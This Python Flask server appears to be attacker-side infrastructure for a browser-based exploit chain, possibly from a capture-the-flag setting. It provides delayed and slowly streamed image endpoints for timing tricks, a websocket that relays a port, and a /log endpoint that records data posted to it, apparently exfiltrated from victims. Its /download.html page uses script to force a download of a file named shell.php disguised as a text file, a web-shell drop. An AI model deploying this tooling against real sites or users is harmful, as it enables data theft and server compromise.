from flask import Flask, request, send_file, stream_with_context, Response
import time
from flask_sock import Sock
from datetime import datetime

app = Flask(__name__)
sock = Sock(app)

@app.route('/')
def index():
    return 'Hit!'


@app.route('/get_image.png')
def get_image():
    time_to_wait = int(request.args.get("wait", 0))
    time.sleep(time_to_wait)
    return send_file("image.png", mimetype="image/png")


@app.route('/get_image_slower.png')
def get_image_slower():
    def generate():
        with open("image.png", "rb") as f:
            while True:
                data = f.read(1)
                if not data:
                    break
                yield data
                time.sleep(1)

    return Response(stream_with_context(generate()), content_type="application/octet-stream")


@sock.route('/get_port')
def send_port(ws):
    done = False
    start_time = datetime.now()
    while not done:
        if (datetime.now() - start_time).total_seconds() > 30:
            print("Websocket timeout")
            break

        try:
            with open('websocket.txt', 'r') as f:
                print("Sendint port back")
                ws.send(f.read())
                print("Port sent back")
                done = True

        except FileNotFoundError:
            print("websocket not found yet")
            time.sleep(1)


@app.route('/log', methods = ['POST'])
def log():
    with open('log.txt', 'a') as f:
        data = request.get_data().decode() 
        print(data)
        f.write(f"{data}\n")
    return 'Hit!'


@app.route('/download.txt')
def download_txt():
    return send_file("shell.php", mimetype="text/plain")


@app.route('/download.html')
def download():
    return """
<!DOCTYPE html>
<html>
    <head>
        <title>Download</title>
    </head>
    <body>
        <a id="download" href="/download.txt" download>Download</a>
        <script>
            const force_download = async () => {
                await new Promise(r => setTimeout(r, 500)); 
                document.getElementById('download').click();
            }
            force_download();
        </script>
    </body>
</html>
"""


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
